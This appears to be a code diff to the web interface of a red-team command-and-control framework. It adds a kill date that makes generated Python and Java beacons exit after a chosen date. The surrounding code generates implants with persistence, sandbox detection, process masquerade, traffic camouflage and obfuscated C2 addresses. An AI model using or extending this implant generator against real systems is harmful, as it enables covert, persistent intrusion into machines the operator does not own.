@@ -157,7 +157,9 @@ const LANG = {
     gen_title:'⚙ Generate Beacon', gen_subtitle:'Authorized engagements only.',
     gen_connection:'Connection', gen_c2_label:'C2 Listeners (primary + fallbacks)',
     gen_add_fallback:'+ Add fallback', gen_sleep:'Sleep (seconds)', gen_jitter:'Jitter %',
-    gen_persist:'Persistence (survives reboots)', gen_evasion:'Evasion',
+    gen_persist:'Persistence (survives reboots)', gen_kill_date:'Kill Date (optional)',
+    gen_kill_date_hint:'Beacon self-destructs after this date. Leave empty for no limit.',
+    gen_evasion:'Evasion',
     ev_traffic:'Traffic camouflage', ev_traffic_desc:'Fake browser User-Agent and real HTTP headers',
     ev_sandbox:'Sandbox detection', ev_sandbox_desc:'Detects VMs, sandboxes and analysis environments',
     ev_masq:'Process masquerade', ev_masq_desc:'Changes process name (Linux)',
@@ -232,7 +234,9 @@ const LANG = {
     gen_title:'⚙ Generar Beacon', gen_subtitle:'Solo para engagements autorizados.',
     gen_connection:'Conexión', gen_c2_label:'C2 Listeners (primario + fallbacks)',
     gen_add_fallback:'+ Agregar fallback', gen_sleep:'Sleep (segundos)', gen_jitter:'Jitter %',
-    gen_persist:'Persistencia (sobrevive reinicios)', gen_evasion:'Evasión',
+    gen_persist:'Persistencia (sobrevive reinicios)', gen_kill_date:'Kill Date (opcional)',
+    gen_kill_date_hint:'El beacon se autodestruye después de esta fecha. Vacío = sin límite.',
+    gen_evasion:'Evasión',
     ev_traffic:'Traffic camouflage', ev_traffic_desc:'Fake browser User-Agent y headers HTTP reales',
     ev_sandbox:'Sandbox detection', ev_sandbox_desc:'Detecta VMs, sandboxes y entornos de análisis',
     ev_masq:'Process masquerade', ev_masq_desc:'Cambia el nombre del proceso (Linux)',
@@ -1434,10 +1438,19 @@ function renderGenerateView() {
               <input type="number" id="gen-jitter" value="20" min="0" max="80">
             </div>
           </div>
-          <label style="display:flex;align-items:center;gap:10px;cursor:pointer;user-select:none;color:var(--text2);font-size:12px">
+          <label style="display:flex;align-items:center;gap:10px;cursor:pointer;user-select:none;color:var(--text2);font-size:12px;margin-bottom:14px">
             <input type="checkbox" id="gen-persist" style="width:15px;height:15px;accent-color:var(--accent);cursor:pointer">
             ${t('gen_persist')}
           </label>
+          <div class="form-group" style="margin:0">
+            <label>${t('gen_kill_date')}</label>
+            <input type="date" id="gen-kill-date"
+              style="background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:var(--font-mono);font-size:13px;padding:8px 12px;outline:none;width:100%;color-scheme:dark"
+              onchange="document.getElementById('gen-kill-date-hint').style.display=this.value?'block':'none'">
+            <div id="gen-kill-date-hint" style="display:none;margin-top:6px;font-size:11px;color:var(--warning);line-height:1.5">
+              ⚠ ${t('gen_kill_date_hint')}
+            </div>
+          </div>
         </div>
 
         <div class="info-card" style="margin:0" id="beacon-info-card">
@@ -2148,9 +2161,10 @@ async function generateBeacon() {
   const urls = [...document.querySelectorAll('.gen-url-input')]
     .map(i => i.value.trim()).filter(Boolean);
   if (!urls.length) { alert(_lang === 'es' ? 'Agrega al menos un listener URL' : 'Add at least one listener URL'); return; }
-  const sleep   = parseInt(document.getElementById('gen-sleep').value) || 5;
-  const jitter  = parseInt(document.getElementById('gen-jitter').value) || 20;
-  const persist = document.getElementById('gen-persist').checked;
+  const sleep    = parseInt(document.getElementById('gen-sleep').value) || 5;
+  const jitter   = parseInt(document.getElementById('gen-jitter').value) || 20;
+  const persist  = document.getElementById('gen-persist').checked;
+  const killDate = document.getElementById('gen-kill-date').value.trim() || null;
   const ev = {
     traffic:    document.getElementById('ev-traffic').checked,
     sandbox:    document.getElementById('ev-sandbox').checked,
@@ -2165,12 +2179,12 @@ async function generateBeacon() {
 
   let code, filename;
   if (_beaconLang === 'java') {
-    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev);
+    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate);
     filename = 'Beacon.java';
     document.getElementById('beacon-dl-buttons-py').style.display   = 'none';
     document.getElementById('beacon-dl-buttons-java').style.display = 'flex';
   } else {
-    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev);
+    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate);
     filename = 'beacon.py';
     document.getElementById('beacon-dl-buttons-py').style.display   = 'flex';
     document.getElementById('beacon-dl-buttons-java').style.display = 'none';
@@ -2181,7 +2195,7 @@ async function generateBeacon() {
   document.getElementById('gen-output').style.display = 'block';
 }
 
-function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}) {
+function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null) {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
@@ -2314,6 +2328,17 @@ def _dec_resp(resp_bytes):
         return resp_bytes
 ` : '';
 
+  const killDateBlock = killDate ? `
+# ── Kill date: beacon expires ${killDate} ──────────────────────
+import datetime as _dtm
+_KILL = _dtm.date.fromisoformat("${killDate}")
+if _dtm.date.today() >= _KILL:
+    sys.exit(0)
+` : '';
+
+  const killDateLoopCheck = killDate
+    ? `\n        if _dtm.date.today() >= _KILL: sys.exit(0)` : '';
+
   const postBodyLine = ev.encrypt
     ? `    body = _enc_body(_json.dumps(data).encode())`
     : `    body = _json.dumps(data).encode()`;
@@ -2351,7 +2376,7 @@ except ImportError:
 _WIN = sys.platform == 'win32'
 SLEEP  = ${sleep}
 JITTER = ${jitter}
-
+${killDateBlock}
 # XOR-decoded at runtime — no plaintext C2 or secret in file
 def _x(h, k):
     b = bytes.fromhex(h); k = k.encode()
@@ -2751,7 +2776,7 @@ def checkin():
 
 def main():
     _t_tick = [0.0]
-    while True:
+    while True:${killDateLoopCheck}
         try:
             resp = checkin()
             if resp and resp.get("task_id"):
@@ -2774,7 +2799,7 @@ if __name__ == "__main__":
 `;
 }
 
-function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}) {
+function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null) {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
@@ -2806,6 +2831,19 @@ function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev
     }` : '';
 
   const sandboxCall = ev.sandbox ? '\n        checkEnv();' : '';
+
+  const killDateBlock = killDate ? `
+    private static void checkKillDate() {
+        try {
+            java.time.LocalDate kill = java.time.LocalDate.parse("${killDate}");
+            if (java.time.LocalDate.now().compareTo(kill) >= 0) System.exit(0);
+        } catch (Exception ignored) {}
+    }` : '';
+
+  const killDateCall = killDate ? '\n        checkKillDate();' : '';
+  const killDateLoopCheck = killDate
+    ? '\n            try { java.time.LocalDate kill = java.time.LocalDate.parse("' + killDate + '"); if (java.time.LocalDate.now().compareTo(kill) >= 0) System.exit(0); } catch (Exception ignored) {}'
+    : '';
 
   const bgBlock = ev.background ? `
     private static void background() {
@@ -2851,6 +2889,7 @@ function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev
     }` : '';
 
   const persistCall = persist ? '\n        persist();' : '';
+
 
   const encryptBlock = ev.encrypt ? `
     private static byte[] encBody(byte[] data) {
@@ -2935,6 +2974,7 @@ public class Beacon {
     ${sandboxBlock}
     ${bgBlock}
     ${persistBlock}
+    ${killDateBlock}
     ${encryptBlock}
 
     // ── XOR decode ────────────────────────────────────────────
@@ -3197,11 +3237,12 @@ public class Beacon {
 
     // ── Main loop ─────────────────────────────────────────────
     public static void main(String[] args) throws Exception {
-        initSsl();${sandboxCall}${bgCall}${persistCall}
+        initSsl();${sandboxCall}${bgCall}${persistCall}${killDateCall}
         agentId = getOrCreateId();
         cwd = System.getProperty("user.dir");
         int sleepMs = SLEEP * 1000;
         while (true) {
+            ${killDateLoopCheck}
             try {
                 String resp = checkin();
                 if (resp != null) {
